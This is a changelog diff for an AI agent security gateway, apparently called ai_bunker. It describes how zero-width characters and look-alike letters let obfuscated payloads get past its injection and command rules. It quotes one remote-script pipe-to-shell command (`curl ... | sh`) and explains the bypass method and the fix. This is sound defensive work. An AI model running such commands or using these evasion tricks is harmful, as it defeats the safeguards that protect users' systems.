@@ -37,6 +37,32 @@ client kits and a dashboard.
   A page costs nothing until it is opened.
 - A content fingerprint, usable both as a prefix-cache key and as provenance.
 
+### Text that hides from the reader
+
+- **Zero-width characters and look-alike letters are removed before any
+  pattern runs** (`ai_bunker/invisible.py`). Found by probing the shipped
+  rules against the obfuscation techniques in the public literature on agent
+  security, after reading the course material from Google's 5-Day artificial
+  intelligence (AI) Agents intensive: three of
+  six payloads walked past all nineteen rules, and two of them walked past a
+  `BLOCKER` on the `command` scope — one invisible character turned
+  `curl https://x.sh | sh` into a command the gateway allowed.
+- Characters with no glyph are stripped from what the model is shown, which
+  cannot change meaning because they carry none. Look-alike letters are left
+  exactly as they arrived and the patterns run against a folded shadow copy,
+  aligned character for character, so a rule can match a disguised payload and
+  redact the real characters. Both findings are reported.
+- `injection.hidden_text` and `injection.homoglyph_text` are **retired**. Both
+  were thresholded — two invisible characters, three look-alikes — and the
+  threshold was the bypass; both flagged the disguise while leaving it in
+  place, so the payload travelled through beside the note. After the
+  normalising pass they cannot fire at all, and a rule that cannot fire is not
+  a control.
+- `ai-bunker spec` learned `\uXXXX` and `\UXXXXXXXX` escapes, in both
+  directions. A specification about invisible characters that contains
+  invisible characters is one nobody can review.
+- 17 rules now, down from 19, with 111 assertions.
+
 ### Rules
 
 - One format, two scopes (`output`, `command`), three severities, with the
